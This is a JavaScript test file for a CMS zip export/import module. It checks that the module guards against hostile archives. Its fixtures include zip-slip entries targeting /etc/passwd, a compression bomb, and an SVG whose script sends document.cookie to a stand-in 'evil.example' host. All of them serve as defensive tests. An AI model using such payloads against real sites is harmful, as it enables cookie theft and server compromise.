/**
 * CMS export bundle (.zip) — round-trip + the hostile-archive guards.
 *
 * The zip is the only export form that actually reconstitutes a website
 * elsewhere, and it is also the only CMS surface where an admin hands us an
 * arbitrary binary archive to unpack. Both properties are tested here: the
 * happy path (bytes survive, keys are preserved so no reference rewriting is
 * needed) and the limits that keep a malicious archive from writing outside
 * the `cms/` namespace or exhausting memory.
 *
 * Run: node --test core/cmsExportBundle.test.js
 */

const test = require('node:test');
const assert = require('node:assert');
const Module = require('module');
const JSZip = require('jszip');

// storageStore is only touched by fetchAssets/restoreAssets; stub it so the
// zip logic is testable without a bucket.
const storage = { objects: new Map(), uploads: [], failNext: null };
const mockStorage = {
    async streamFile(key) {
        if (!storage.objects.has(key)) {
            const e = new Error(`Object not found: ${key}`);
            e.name = 'NoSuchKey';
            throw e;
        }
        const { buffer, contentType } = storage.objects.get(key);
        const { Readable } = require('stream');
        return { stream: Readable.from([buffer]), contentType, contentLength: buffer.length };
    },
    async headFile(key) {
        if (!storage.objects.has(key)) {
            const e = new Error(`Object not found: ${key}`);
            e.name = 'NoSuchKey';
            throw e;
        }
        return { contentLength: storage.objects.get(key).buffer.length };
    },
    async uploadFile(key, buffer, contentType, metadata = null) {
        if (storage.failNext === key) { storage.failNext = null; throw new Error('storage offline'); }
        storage.objects.set(key, { buffer, contentType });
        storage.uploads.push({ key, contentType, bytes: buffer.length, metadata });
        return { key };
    },
};

const MOCK_ID = 'mock:storageStore';
require.cache[MOCK_ID] = { id: MOCK_ID, filename: MOCK_ID, loaded: true, exports: mockStorage };
const originalResolve = Module._resolveFilename;
Module._resolveFilename = function (request, parent, ...rest) {
    if (request === '../../stores/storageStore') return MOCK_ID;
    return originalResolve.call(this, request, parent, ...rest);
};

const bundleLib = require('./cmsExportBundle');

const SAMPLE_BUNDLE = {
    _beeflow_export: true,
    version: 2,
    site: { name: 'Demo', pages: [{ slug: 'home', blocks: [] }] },
};

test('zip round-trip preserves the bundle and every asset key', async () => {
    const assets = [
        { key: 'cms/1700-logo.svg', buffer: Buffer.from('<svg/>') },
        { key: 'cms/1700-hero.png', buffer: Buffer.from([0x89, 0x50, 0x4e, 0x47]) },
    ];
    const zipBuf = await bundleLib.buildZip(SAMPLE_BUNDLE, assets);
    assert.ok(Buffer.isBuffer(zipBuf) && zipBuf.length > 0);

    const parsed = await bundleLib.parseZip(zipBuf);
    assert.deepStrictEqual(parsed.bundle, SAMPLE_BUNDLE);
    assert.deepStrictEqual(parsed.skipped, []);
    assert.deepStrictEqual(
        parsed.assets.map(a => a.key).sort(),
        ['cms/1700-hero.png', 'cms/1700-logo.svg'],
        'keys must survive verbatim — that is what makes reference rewriting unnecessary',
    );
    const png = parsed.assets.find(a => a.key === 'cms/1700-hero.png');
    assert.deepStrictEqual([...png.buffer], [0x89, 0x50, 0x4e, 0x47], 'bytes must be intact');
});

test('a zip without site.json is rejected with a useful message', async () => {
    const zip = new JSZip();
    zip.file('readme.txt', 'hello');
    const buf = await zip.generateAsync({ type: 'nodebuffer' });
    await assert.rejects(() => bundleLib.parseZip(buf), /missing site\.json/);
});

test('non-zip and empty input are rejected, not crashed on', async () => {
    await assert.rejects(() => bundleLib.parseZip(Buffer.from('this is not a zip')), /not a valid \.zip/i);
    await assert.rejects(() => bundleLib.parseZip(Buffer.alloc(0)), /Empty upload/);
});

test('site.json that is not JSON is rejected', async () => {
    const zip = new JSZip();
    zip.file('site.json', '{ nope');
    const buf = await zip.generateAsync({ type: 'nodebuffer' });
    await assert.rejects(() => bundleLib.parseZip(buf), /not valid JSON/);
});

test('zip-slip and out-of-namespace entries are skipped, never unpacked', async () => {
    const zip = new JSZip();
    zip.file('site.json', JSON.stringify(SAMPLE_BUNDLE));
    zip.file('assets/../../etc/passwd', 'root:x:0:0');
    zip.file('assets/cms/../../../evil.sh', '#!/bin/sh');
    zip.file('assets/uploads/other.png', 'x');       // outside the cms/ namespace
    zip.file('/etc/absolute', 'x');
    zip.file('assets/cms/good.png', 'ok');
    const buf = await zip.generateAsync({ type: 'nodebuffer' });

    const parsed = await bundleLib.parseZip(buf);
    assert.deepStrictEqual(parsed.assets.map(a => a.key), ['cms/good.png']);
    assert.strictEqual(parsed.skipped.length, 4, 'every rejected entry must be reported, not silently dropped');
});

test('assetEntryToKey refuses everything outside assets/cms/', () => {
    assert.strictEqual(bundleLib.assetEntryToKey('assets/cms/a.png'), 'cms/a.png');
    assert.strictEqual(bundleLib.assetEntryToKey('assets/cms/../x'), null);
    assert.strictEqual(bundleLib.assetEntryToKey('assets/other/a.png'), null);
    assert.strictEqual(bundleLib.assetEntryToKey('cms/a.png'), null);
    assert.strictEqual(bundleLib.assetEntryToKey('assets/cms/a\\b.png'), null);
    assert.strictEqual(bundleLib.assetEntryToKey(`assets/cms/${'x'.repeat(600)}.png`), null);
});

test('an over-long total inflated size is rejected (zip bomb)', async () => {
    const zip = new JSZip();
    zip.file('site.json', JSON.stringify(SAMPLE_BUNDLE));
    // Highly compressible zeros: tiny on disk, 200 MB+ inflated.
    const chunk = Buffer.alloc(40 * 1024 * 1024);
    for (let i = 0; i < 6; i++) zip.file(`assets/cms/bomb${i}.bin`, chunk);
    // Level 1, not JSZip's default 6: the archive goes 246 KB -> 1.05 MB
    // (still a 229:1 bomb) and this file goes ~5.7s -> ~4.0s. The 240 MB
    // INFLATED is the work and must stay — parseZip sums real inflated byte
    // lengths before it can refuse, so proving the guard fires means actually
    // inflating past MAX_TOTAL_BYTES.
    const buf = await zip.generateAsync({
        type: 'nodebuffer', compression: 'DEFLATE', compressionOptions: { level: 1 },
    });
    // The fixture must stay bomb-SHAPED: tiny on disk, enormous inflated.
    // Dropping to STORE would "speed this up" by shipping a 240 MB buffer.
    assert.ok(buf.length < 4 * 1024 * 1024,
        `bomb fixture is ${buf.length} bytes on disk — it is no longer a compression bomb`);

    await assert.rejects(() => bundleLib.parseZip(buf), /total size limit/);
});

test('too many entries is rejected before anything is inflated', async () => {
    const zip = new JSZip();
    zip.file('site.json', JSON.stringify(SAMPLE_BUNDLE));
    for (let i = 0; i <= bundleLib.MAX_ENTRIES; i++) zip.file(`assets/cms/f${i}.txt`, 'x');
    const buf = await zip.generateAsync({ type: 'nodebuffer' });
    await assert.rejects(() => bundleLib.parseZip(buf), /too many entries/i);
});

// ── Storage edges ────────────────────────────────────────────────────

test('fetchAssets reports misses instead of failing the whole export', async () => {
    storage.objects.clear();
    storage.objects.set('cms/present.png', { buffer: Buffer.from('abc'), contentType: 'image/png' });

    const { assets, missing } = await bundleLib.fetchAssets(['cms/present.png', 'cms/gone.png']);
    assert.deepStrictEqual(assets.map(a => a.key), ['cms/present.png']);
    assert.strictEqual(missing.length, 1);
    assert.match(missing[0], /cms\/gone\.png .*not found in storage/,
        'a partly-wiped bucket must still produce an archive, with the gap named');
});

test('restoreAssets writes missing keys, leaves existing ones alone', async () => {
    storage.objects.clear();
    storage.uploads.length = 0;
    storage.objects.set('cms/already.png', { buffer: Buffer.from('old'), contentType: 'image/png' });

    const result = await bundleLib.restoreAssets([
        { key: 'cms/already.png', buffer: Buffer.from('NEW BYTES') },
        { key: 'cms/fresh.svg', buffer: Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 8"><rect width="8" height="8"/></svg>') },
    ]);

    assert.strictEqual(result.written, 1);
    assert.strictEqual(result.reused, 1);
    assert.deepStrictEqual(result.failed, []);
    assert.deepStrictEqual(storage.objects.get('cms/already.png').buffer, Buffer.from('old'),
        'an existing key means the same file — never overwrite it');
    assert.strictEqual(storage.uploads[0].contentType, 'image/svg+xml',
        'content type is inferred from the key when the bundle did not record one');
});

// The seeder passes overwrite:true because it OWNS its keys — they are stable
// (`cms/beeflow-hive.svg`, no content hash) and generated from source. Without
// this an edited hero graphic never reaches storage: the seed reports success,
// the old bytes keep being served, and nothing explains the discrepancy.
// Import must NOT get this, which the test above pins.
test('restoreAssets overwrites existing keys when the caller owns them', async () => {
    storage.objects.clear();
    storage.uploads.length = 0;
    storage.objects.set('cms/already.png', { buffer: Buffer.from('old'), contentType: 'image/png' });

    const result = await bundleLib.restoreAssets(
        [{ key: 'cms/already.png', buffer: Buffer.from('NEW BYTES') }],
        { overwrite: true },
    );

    assert.strictEqual(result.written, 1);
    assert.strictEqual(result.reused, 0);
    assert.deepStrictEqual(storage.objects.get('cms/already.png').buffer, Buffer.from('NEW BYTES'),
        'the seeder must be able to change an asset it generated');
});

test('an imported SVG is re-sanitized and tagged from OUR result, not the archive\'s claim', async () => {
    storage.objects.clear();
    storage.uploads.length = 0;

    const hostile = Buffer.from(
        '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("https://evil.example/"+document.cookie)</script>'
        + '<rect width="10" height="10" onload="alert(1)"/></svg>'
    );
    const result = await bundleLib.restoreAssets([
        { key: 'cms/logo.svg', buffer: hostile, metadata: { sanitized: '1' } },
    ]);

    assert.strictEqual(result.written, 1);
    const stored = storage.objects.get('cms/logo.svg').buffer.toString();
    assert.ok(!/<script/i.test(stored), 'the script element must be stripped before storage');
    assert.ok(!/onload/i.test(stored), 'inline event handlers must be stripped before storage');
    assert.deepStrictEqual(storage.uploads[0].metadata, { sanitized: '1' },
        'the tag must come from OUR sanitizer run — the asset route serves a tagged SVG inline');
});

test('an SVG that cannot be sanitized is skipped, never stored raw', async () => {
    storage.objects.clear();
    const result = await bundleLib.restoreAssets([
        { key: 'cms/broken.svg', buffer: Buffer.from('not markup at all') },
    ]);
    assert.strictEqual(result.written, 0);
    assert.match(result.failed[0], /invalid or unsafe SVG/);
    assert.strictEqual(storage.objects.has('cms/broken.svg'), false);
});

test('restoreAssets collects failures rather than aborting the import', async () => {
    storage.objects.clear();
    storage.failNext = 'cms/boom.png';
    const result = await bundleLib.restoreAssets([
        { key: 'cms/boom.png', buffer: Buffer.from('x') },
        { key: 'cms/ok.png', buffer: Buffer.from('y') },
    ]);
    assert.strictEqual(result.written, 1);
    assert.strictEqual(result.failed.length, 1);
    assert.match(result.failed[0], /cms\/boom\.png/);
});

test('guessContentType covers the CMS upload whitelist', () => {
    assert.strictEqual(bundleLib.guessContentType('cms/a.png'), 'image/png');
    assert.strictEqual(bundleLib.guessContentType('cms/a.SVG'), 'image/svg+xml');
    assert.strictEqual(bundleLib.guessContentType('cms/a.mp4'), 'video/mp4');
    assert.strictEqual(bundleLib.guessContentType('cms/noext'), 'application/octet-stream');
});
